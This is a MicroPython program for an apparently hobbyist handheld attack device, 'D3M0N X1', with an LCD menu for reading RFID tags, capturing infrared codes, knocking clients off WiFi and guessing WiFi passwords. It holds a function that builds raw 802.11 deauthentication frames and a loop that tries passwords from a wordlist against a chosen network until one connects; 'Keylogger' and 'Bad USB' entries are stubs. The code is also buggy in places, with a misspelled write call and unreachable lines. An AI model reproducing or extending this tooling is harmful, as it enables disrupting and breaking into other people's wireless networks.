import network
from machine import Pin,PWM
from time import sleep
from irrecvdata import irGetCMD
from machine import Pin, SoftSPI, I2C
from I2C_LCD import I2CLcd
from mfrc522 import MFRC522
import socket
import uos
import _thread
import micropython
#import pyb
#from adafruit_hid.keyboard import Keyboard
#from adafruit_hid.keycode import Keycode


global lastdisplay2
lastdisplay2=""

# Function definition area
def getSetting(name):
	result = "Setting not found"
	with open("/D3M0N_settings.txt", "r") as fp:
		temp = fp.read().split("\r\n")
		for line in temp:
			if line.startswith(name+": "):
				result = line.replace(name+": ", "")
				print("FOUND ("+name+") value ("+result+")")
		fp.close()
	return result

def setSetting(name, value):
	settingsfinal=""
	with open("/D3M0N_settings.txt", "r") as fp:
		settings = fp.read().split("\n")
		for line in settings:
			if line.startswith(name+": "):
				settingsfinal+="\n"+name+": "+value
			else:
				settingsfinal+="\n"+line
		fp.close()
	with open("/D3M0N_settings.txt", "w") as fp:
		fp.wite(settingsfinal)
		fp.close()

def AP_Setup(ssidAP,passwordAP):
	ap_if.disconnect()
	ap_if.ifconfig([local_IP,gateway,subnet,dns])
	print("Setting AP... ")
	ap_if.config(essid=ssidAP, password=passwordAP)
	#ap_if.active(True)
	print('Success, IP address:', ap_if.ifconfig())
	print("Setup End\n")


def read_rfid_uid():
	sck = Pin(2, Pin.OUT)
	copi = Pin(3, Pin.OUT) # Controller out, peripheral in
	cipo = Pin(4, Pin.OUT) # Controller in, peripheral out
	spi = SoftSPI(baudrate=100000, polarity=0, phase=0, sck=sck, mosi=copi, miso=cipo)
	sda = Pin(5, Pin.OUT)
	reader = MFRC522(spi, sda)
	
	(status, tag_type) = reader.request(reader.CARD_REQIDL)#Read the card type number
	if status == reader.OK:
		print('Find the card!')
		(status, raw_uid) = reader.anticoll()#Reads the card serial number of the selected card
		if status == reader.OK:
			return '0x%02x%02x%02x%02x' % (raw_uid[0], raw_uid[1], raw_uid[2], raw_uid[3])
			print('')
			if reader.select_tag(raw_uid) == reader.OK:#Read card memory capacity
				key = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]
				if reader.auth(reader.AUTH, 8, key, raw_uid) == reader.OK:#Verification card password
					print(bytearray(reader.read(8)))
					reader.stop_crypto1()
				else:
					print("AUTH ERROR")
			else:
				print("FAILED TO SELECT TAG")
	return ''

def deauth(_ap,_client,type,reason,sta_if):
    # 0 - 1   type, subtype c0: deauth (a0: disassociate)
    # 2 - 3   duration (SDK takes care of that)
    # 4 - 9   reciever (target)
    # 10 - 15 source (ap)
    # 16 - 21 BSSID (ap)
    # 22 - 23 fragment & squence number
    # 24 - 25 reason code (1 = unspecified reason)
    packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
    for i in range(0,6):
        packet[4 + i] =_client[i]
        packet[10 + i] = packet[16 + i] =_ap[i]
    #set type
    packet[0] = type;
    packet[24] = reason
    result=sta_if.freedom(packet)
    if result==0:
        sleep(0.01)
        return True
    else:
        return False

def webserver():
	addr = socket.getaddrinfo('0.0.0.0', 80)[0][-1]
	s = socket.socket()
	s.bind(addr)
	s.listen(1)
	print('listening on', addr)
	# Listen for connections
	while True:
		try:
			cl, addr = s.accept()
			print('client connected from', addr)
			request = cl.recv(1024)
			print(request)

			cl.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
			cl.send("<html><body><h1>hello world</h1></body></html>")
			cl.close()

		except OSError as e:
			cl.close()
			print('connection closed')


i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
devices = i2c.scan()
lcd = I2CLcd(i2c, 0x3f, 2, 16)

def display(text, line, middle=False, lastdisplay=lastdisplay2):
	if middle:
		lcd.move_to(int(8-len(text)/2), line)
	else:
		lcd.move_to(0, line)
	if text!=lastdisplay:
		lcd.putstr(text)
	lastdisplay=text

def update_menu_wifi(menu):
	lcd.clear()
	display("WIFI", 0, True)
	if menu == 0:
		menu = 1
	if menu == 1:
		display(" > Kill wifi    ", 1)
	if menu == 2:
		display(" > Find wifi pwd", 1)
	if menu == 3:
		display(" > other        ", 1)
	if menu == 4:
		menu = 3

def update_menu(menu):
	if menu == 0:
		menu = 1
	if menu == 1:
		lcd.clear()
		lcd.putstr(">RFID           ")
		lcd.putstr(" Infrared       ")
	if menu == 2:
		lcd.clear();
		lcd.putstr(" RFID           ")
		lcd.putstr(">Infrared       ")
	if menu == 3:
		lcd.clear()
		lcd.putstr(">Wifi           ")
		lcd.putstr(" Keyboard hack  ")
	if menu == 4:
		lcd.clear()
		lcd.putstr(" Wifi           ")
		lcd.putstr(">Keyboard hack  ")
	if menu == 5:
		lcd.clear()
		lcd.putstr(">About           ")
		lcd.putstr("                 ")
	if menu == 6:
		menu = 5

def keylogger():
	while True:
	  cmd = sys.stdin.read(1)
	  if cmd == 'a':
		print("a")
def bad_usb():
	print("bad usb")


def selectoption_wifi(menu):
	if menu == 1:
		lcd.clear()
		display("Deauth", 0, True)
		display("press ok to stop", 1)
		while True:
			if not button_ok.value():
				print("finished deauth")
				break
	if menu == 2:
		lcd.clear()
		display("Find wifi pwd", 0, True)
		a=0
		totaltry="500"
		
		sta_if = network.WLAN(network.STA_IF)
		networks=sta_if.scan()
		
		networks_list = []
		
		for ap in networks:
			if not ap[5] == 0:
				networks_list.append(str(ap[0]).replace("b'", "").replace("'", ""))
			#print("BSSID: "+str(ap[1]))
			#print("Channel: "+str(ap[2]))
			#print("RSSI: "+str(ap[3]))
			#print("Security: "+str(ap[4]))
		
		selectedSSID=""
		if len(networks_list) > 0:
			display("  Select  WIFI  >"+networks_list[0][0:15], 0)
			menu3=1
			while True:
				if not button_down.value() and not menu3==len(networks_list):
					menu3=menu3+1
					display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
				if not button_up.value() and not menu3==1:
					menu3=menu3-1
					display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
				if not button_ok.value():
					selectedSSID=networks_list[menu3-1]
					break
			print("Selected SSID: "+selectedSSID)
		else:
			display("No wifi avaiable", 0)
		sleep(1)
		#ap_if.disconnect()
		#ap_if.active(False)
		#sta_if.active(True)
		password="error"
		while True:
			sleep(0.5)
			display("                ", 1)
			display("["+str(a)+"/"+str(totaltry)+"]", 1)
			
			with open(getSetting("password_list"), "r") as fp:
				password=fp.read().split("\r\n")
			
			try:
				sta_if.connect(selectedSSID, password[a])
				sleep(1)
				if sta_if.isconnected():
					display("pwd: "+password[a], 1)
					while True:
						if not button_ok.value():
							break
					break
				else:
					a=a+1
			except OSError:
				display("Can't reach wifi", 1)
				break
			if not button_ok.value():
				break
		#ap_if.active(True)
		#sta_if.active(False)
		AP_Setup(ssidAP,passwordAP)
		return
	if menu == 3:
		lcd.clear()
		display("uwu2 ", 0)
		display("uwu2 ", 1)



def selectoption(menu):
	if menu == 1:
		lcd.clear()
		display("      RFID      waiting card", 0)
		try:
			while True:
				value = read_rfid_uid()
				if value:
					display("UID: "+value, 1)
					break
		except:
			pass
	if menu == 2:
		lcd.clear();
		display("Infrared", 0, True)
		display("waiting signal", 0, True)
		recvPin = irGetCMD(15)
		try:
			while True:
				value = recvPin.ir_read()
				if value:
					display("Data: "+value, 1)
					break
		except:
			pass
	if menu == 3:
		lcd.clear()
		display("WIFI", 0, True)
		display(" > Deauth     ", 1)
		menu2=1
		sleep(1)
		while True:
			if not button_up.value() and menu2==1:
				return
			elif not button_down.value() and not menu2==4:
				menu2=menu2+1
				update_menu_wifi(menu2)
				while not button_down.value():
					sleep(0)
			elif not button_up.value() and not menu2==1:
				menu2=menu2-1
				update_menu_wifi(menu2)
				while not button_up.value():
					sleep(0)
			elif not button_ok.value():
				selectoption_wifi(menu2)
				update_menu_wifi(menu2)
				while not button_ok.value():
					sleep(0)
	if menu == 4:
		lcd.clear()
		display("Keyboard hacks", 0, True)
		display(" > Keylogger    ", 1)
		menu2=1
		sleep(1)
		while True:
			if not button_up.value() and menu2==1:
				return
			elif not button_down.value() and not menu2==2:
				menu2=menu2+1
				if menu2==1:
					display(" > Keylogger    ", 1)
				else:
					display(" > Bad USB      ", 1)
				while not button_down.value():
					sleep(0)
			elif not button_up.value() and not menu2==1:
				menu2=menu2-1
				if menu2==1:
					display(" > Keylogger    ", 1)
				else:
					display(" > Bad USB      ", 1)
				while not button_up.value():
					sleep(0)
			elif not button_ok.value():
				if menu2==1:
					keylogger()
					display(" > Keylogger    ", 1)
				else:
					bad_usb()
					display(" > Bad USB      ", 1)
				while not button_ok.value():
					sleep(0)
	if menu == 5:
		lcd.clear()
		about_text = "D3M0N X1, is made by duckpvpteam, duckpvpteam.com"
		aboutchars=list(about_text)
		display("About", 0, True)
		i=0
		
		while button_ok.value():
			try:
				finalvar=aboutchars[i]+aboutchars[i+1]+aboutchars[i+2]+aboutchars[i+3]+aboutchars[i+4]+aboutchars[i+5]+aboutchars[i+6]+aboutchars[i+7]+aboutchars[i+8]+aboutchars[i+9]+aboutchars[i+10]+aboutchars[i+11]+aboutchars[i+12]+aboutchars[i+13]+aboutchars[i+14]+aboutchars[i+15]
				i=i+1
				display(finalvar, 1)
				sleep(0.5)
			except:
				i=0
		print("finished")
		return



# vars definition
ssidAP = getSetting("ap_ssid")
passwordAP = getSetting("ap_password")

local_IP = '192.168.4.1'
gateway = '192.168.1.1'
subnet  = '255.255.255.0'
dns = '8.8.8.8'

button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
button_down = Pin(18, Pin.IN, Pin.PULL_UP)	

# main display
display("    D3M0N X1     by duckpvpteam", 0)
# setup AP
ap_if = network.WLAN(network.AP_IF)
try:
	AP_Setup(ssidAP,passwordAP)
except:
	lcd.clear()
	display("Failed start AP", 0)
	ap_if.disconnect()

try:
	print("done")
	#micropython.schedule(webserver, 0)
except:
	lcd.clear()
	display("Failed start web server", 0)


# display
sleep(2)
lcd.clear()
lcd.putstr(">RFID           ")
lcd.putstr(" Infrared       ")

menu = 1
while True:
	if not button_down.value() and not menu==4:
		menu=menu+1
		update_menu(menu)
		while not button_down.value():
			sleep(0)
	elif not button_up.value() and not menu==1:
		menu=menu-1
		update_menu(menu)
		while not button_up.value():
			sleep(0)
	elif not button_ok.value():
		selectoption(menu)
		while not button_ok.value():
			sleep(0)
